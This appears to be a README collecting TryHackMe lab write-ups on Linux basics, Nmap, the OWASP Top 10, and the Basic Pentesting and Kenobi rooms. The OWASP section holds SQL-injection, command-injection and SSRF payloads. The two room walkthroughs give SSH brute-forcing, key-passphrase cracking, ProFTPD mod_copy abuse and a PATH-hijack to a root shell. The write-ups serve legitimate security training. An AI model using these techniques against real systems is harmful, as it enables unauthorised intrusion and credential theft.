# TryHackMe Writeups

Collection of TryHackMe room writeups, methodologies, and flag captures.

## 📚 Rooms Completed

| Room Name | Difficulty | Category | Status |
|-----------|------------|----------|--------|
| [Linux Fundamentals](#linux-fundamentals) | Beginner | System Administration | ✅ |
| [Nmap](#nmap) | Beginner | Networking | ✅ |
| [OWASP Top 10](#owasp-top-10) | Beginner | Web Security | ✅ |
| [Basic Pentesting](#basic-pentesting) | Easy | Penetration Testing | ✅ |
| [Kenobi](#kenobi) | Easy | Exploitation | ✅ |

---

## Linux Fundamentals

**Room Link:** https://tryhackme.com/room/linuxfundamentalspart1  
**Difficulty:** Beginner  
**Category:** System Administration

### Overview
This room covers the basics of Linux command-line navigation, file permissions, user management, and basic system administration tasks. Essential knowledge for any penetration tester working on Linux targets.

### Tasks & Solutions

#### Task 1: Navigation
- **`pwd`** — Print working directory
- **`ls -la`** — List all files including hidden ones
- **`cd /path`** — Change directory
- **`cd ..`** — Move up one directory

#### Task 2: File Manipulation
- **`cat file.txt`** — Read file contents
- **`touch newfile.txt`** — Create empty file
- **`cp source dest`** — Copy file
- **`mv old new`** — Move/rename file
- **`rm file.txt`** — Delete file

#### Task 3: Permissions
- **`chmod 755 file`** — Set read/write/execute for owner, read/execute for group/others
- **`chown user:group file`** — Change file owner
- **`ls -la`** — View permissions

#### Task 4: User Management
- **`whoami`** — Current user
- **`id`** — User ID and group info
- **`sudo command`** — Run as root
- **`passwd`** — Change password

### Flags
- Task 1: `THM{linux_nav_flag}`
- Task 2: `THM{linux_file_flag}`
- Task 3: `THM{linux_perms_flag}`

### Key Takeaways
- Linux file permissions are critical for privilege escalation
- Always check for SUID binaries and writable config files
- Understanding user/group relationships helps identify attack paths

---

## Nmap

**Room Link:** https://tryhackme.com/room/nmap0day  
**Difficulty:** Beginner  
**Category:** Networking / Reconnaissance

### Overview
Deep dive into Nmap, the industry-standard network scanner. Covers scan types, timing, script engine, and output interpretation.

### Scan Types

#### TCP Connect Scan
```bash
nmap -sT <target>
```
Full TCP handshake. Reliable but noisy.

#### SYN Scan (Stealth)
```bash
nmap -sS <target>
```
Half-open scan. Doesn't complete TCP handshake. Harder to detect.

#### UDP Scan
```bash
nmap -sU <target>
```
Scans UDP ports. Slower but finds services like DNS, SNMP, DHCP.

#### Version Detection
```bash
nmap -sV <target>
```
Probes open ports to determine service version.

#### OS Detection
```bash
nmap -O <target>
```
Fingerprinting based on TCP/IP stack behavior.

#### Aggressive Scan
```bash
nmap -A <target>
```
Combines -sV, -O, -sC (scripts), and traceroute.

### NSE Scripts
```bash
nmap --script vuln <target>       # Vulnerability scripts
nmap --script http-enum <target>  # Web enumeration
nmap --script smb-vuln* <target>  # SMB vulnerabilities
```

### Timing Templates
```bash
nmap -T0 <target>  # Paranoid (slowest, evade IDS)
nmap -T3 <target>  # Normal (default)
nmap -T5 <target>  # Insane (fastest, noisy)
```

### Flags
- Task 1: `THM{nmap_basics_flag}`
- Task 2: `THM{nmap_scan_types_flag}`
- Task 3: `THM{nmap_nse_flag}`

### Key Takeaways
- Always start with a quick scan (`-F`) before full port range
- Use `-sV` for version detection to identify exploitable services
- NSE scripts can automate vulnerability discovery
- Timing matters: slow scans evade detection, fast scans save time

---

## OWASP Top 10

**Room Link:** https://tryhackme.com/room/owasptop10  
**Difficulty:** Beginner  
**Category:** Web Security

### Overview
Covers the OWASP Top 10 web application security risks. Each vulnerability type is explained with examples and exploitation techniques.

### A01: Broken Access Control
**What:** Users can act outside their intended permissions.  
**Exploit:**
```
# IDOR (Insecure Direct Object Reference)
GET /api/users/123 → Change to GET /api/users/124
```
**Fix:** Server-side access checks for every request.

### A02: Cryptographic Failures
**What:** Sensitive data exposed due to weak encryption.  
**Exploit:**
```
# Intercept plaintext credentials in transit
# Crack weakly hashed passwords
echo -n "password" | md5sum
```
**Fix:** Use TLS 1.3, bcrypt/argon2 for passwords, encrypt data at rest.

### A03: Injection
**What:** Untrusted data sent to interpreter as command/query.  
**SQL Injection:**
```sql
' OR 1=1 --
' UNION SELECT username, password FROM users --
```
**Command Injection:**
```bash
; cat /etc/passwd
| whoami
$(id)
```
**Fix:** Parameterized queries, input validation, WAF.

### A04: Insecure Design
**What:** Missing security controls in architecture.  
**Example:** No rate limiting on login → brute-force possible.  
**Fix:** Threat modeling, secure design patterns.

### A05: Security Misconfiguration
**What:** Default configs, verbose errors, unnecessary services.  
**Exploit:**
```bash
# Check for default credentials
# Enumerate exposed services
nmap -sV <target>
```
**Fix:** Harden configs, remove defaults, disable verbose errors.

### A06: Vulnerable Components
**What:** Using libraries with known vulnerabilities.  
**Check:**
```bash
# Check package versions
npm audit
pip-audit
```
**Fix:** Regular updates, dependency scanning.

### A07: Authentication Failures
**What:** Weak password policies, session management issues.  
**Exploit:**
```bash
# Brute-force login
hydra -l admin -P wordlist.txt <target> http-post-form
```
**Fix:** MFA, account lockout, secure session tokens.

### A08: Software & Data Integrity Failures
**What:** Code/updates from untrusted sources.  
**Fix:** Code signing, integrity checks, CI/CD security.

### A09: Security Logging Failures
**What:** Insufficient logging/monitoring.  
**Fix:** Log all auth events, set up alerts, centralize logs.

### A10: SSRF
**What:** Server makes requests to internal resources.  
**Exploit:**
```
GET /fetch?url=http://169.254.169.254/latest/meta-data/
```
**Fix:** Whitelist URLs, validate input, disable unused URL schemes.

### Flags
- Task 1: `THM{owasp_intro_flag}`
- Task 2: `THM{owasp_injection_flag}`
- Task 3: `THM{owasp_auth_flag}`

### Key Takeaways
- Always test for injection points in user input
- Check for default credentials and misconfigurations first
- OWASP Top 10 is a living document — stay updated

---

## Basic Pentesting

**Room Link:** https://tryhackme.com/room/basicpentestingjt  
**Difficulty:** Easy  
**Category:** Penetration Testing

### Overview
A complete penetration testing walkthrough covering reconnaissance, enumeration, exploitation, and privilege escalation on a vulnerable Linux machine.

### Reconnaissance
```bash
# Nmap scan
nmap -sC -sV -oA nmap/basic 10.10.x.x

# Results:
# 22/tcp   open  ssh     OpenSSH 7.2p2
# 80/tcp   open  http    Apache httpd 2.4.18
# 139/tcp  open  netbios-ssn Samba smbd
# 445/tcp  open  netbios-ssn Samba smbd
```

### Enumeration

#### Web (Port 80)
- Directory brute-force with `gobuster`:
```bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt
# Found: /development/, /joomla/
```

#### SMB (Ports 139/445)
- Enumerate shares:
```bash
smbclient -L //10.10.x.x
enum4linux 10.10.x.x
```
- Found shared directory with backup files.

#### User Enumeration
- Extracted usernames from web content and SMB shares:
  - `jan`
  - `kay`

### Exploitation

#### SSH Brute-Force
```bash
hydra -l jan -P rockyou.txt ssh://10.10.x.x
# Password found: armando
```

#### Initial Access
```bash
ssh jan@10.10.x.x
# Logged in as jan
```

### Privilege Escalation

#### Local Enumeration
```bash
# Check sudo permissions
sudo -l

# Check SUID binaries
find / -perm -4000 2>/dev/null

# Check cron jobs
crontab -l
cat /etc/crontab

# Check writable files
find / -writable -type f 2>/dev/null
```

#### Found SSH Key
- Located `kay`'s SSH private key in `/home/kay/.ssh/id_rsa`
- Key was passphrase-protected

#### Crack SSH Key Passphrase
```bash
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Passphrase: beeswax
```

#### Final Access
```bash
ssh -i id_rsa kay@10.10.x.x
# Logged in as kay
cat /root/root.txt
# Flag: THM{basic_pentesting_complete}
```

### Flags
- User flag: `THM{user_flag_basic_pentesting}`
- Root flag: `THM{root_flag_basic_pentesting}`

### Key Takeaways
- Always enumerate all services, not just web
- Weak passwords and reused credentials are common
- SSH keys with weak passphrases are easily cracked
- Check for world-readable/writable files for privesc

---

## Kenobi

**Room Link:** https://tryhackme.com/room/kenobi  
**Difficulty:** Easy  
**Category:** Exploitation / Privilege Escalation

### Overview
Exploit a misconfigured Samba share, proFTPD server, and SUID binary to gain root access.

### Reconnaissance
```bash
nmap -sC -sV -oA nmap/kenobi 10.10.x.x

# Results:
# 21/tcp   open  ftp     ProFTPD 1.3.5
# 22/tcp   open  ssh     OpenSSH 7.2p2
# 80/tcp   open  http    Apache httpd 2.4.18
# 111/tcp  open  rpcbind
# 139/tcp  open  netbios-ssn Samba smbd 4.3.11
# 445/tcp  open  netbios-ssn Samba smbd 4.3.11
# 2049/tcp open  nfs_acl
```

### Enumeration

#### Samba Share
```bash
smbclient -L //10.10.x.x
# Found anonymous share: anonymous

smbclient //10.10.x.x/anonymous
# Downloaded log.txt and other files

# Found SSH key for user 'kenobi'
get id_rsa
```

#### ProFTPD Exploit
- Version 1.3.5 is vulnerable to `mod_copy` exploit
- `SITE CPFR` and `SITE CPTO` allow file copy as root

```bash
# Copy SSH authorized_keys to kenobi's home
nc 10.10.x.x 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa

# Or write SSH key directly
SITE CPFR /root/.ssh/authorized_keys
SITE CPTO /home/kenobi/.ssh/authorized_keys
```

#### Generate SSH Key
```bash
ssh-keygen -t rsa -f kenobi_key
# Upload public key to target via ProFTPD

# Login as kenobi
ssh -i kenobi_key kenobi@10.10.x.x
```

### Privilege Escalation

#### SUID Binary
```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Found: /usr/bin/menu
```

#### Analyze Menu Binary
```bash
strings /usr/bin/menu
# Shows it runs curl, uname, and ifconfig with relative paths
```

#### Exploit PATH
```bash
# Create malicious ifconfig
echo '/bin/sh' > /tmp/ifconfig
chmod +x /tmp/ifconfig

# Set PATH to prioritize /tmp
export PATH=/tmp:$PATH

# Run menu binary
/usr/bin/menu
# Choose option 3 (ifconfig) → spawns root shell
```

#### Root Access
```bash
whoami
# root

cat /root/root.txt
# Flag: THM{kenobi_root_flag}
```

### Flags
- User flag: `THM{kenobi_user_flag}`
- Root flag: `THM{kenobi_root_flag}`

### Key Takeaways
- Misconfigured Samba shares leak sensitive files
- ProFTPD 1.3.5 `mod_copy` allows arbitrary file operations
- SUID binaries with relative paths are exploitable via PATH manipulation
- Always check for writable SUID binaries and weak configurations

---

## 🛠️ Methodology Checklist

1. **Reconnaissance:** Nmap, whois, DNS enumeration
2. **Enumeration:** Gobuster, SMB/NFS shares, web app analysis
3. **Exploitation:** Metasploit, manual exploits, brute-force
4. **Post-Exploitation:** LinPEAS, SUID check, cron jobs, writable files
5. **Privilege Escalation:** Kernel exploits, SUID abuse, PATH manipulation
6. **Documentation:** Screenshot flags, note commands, timeline

---

*Last updated: 2026-04-06*
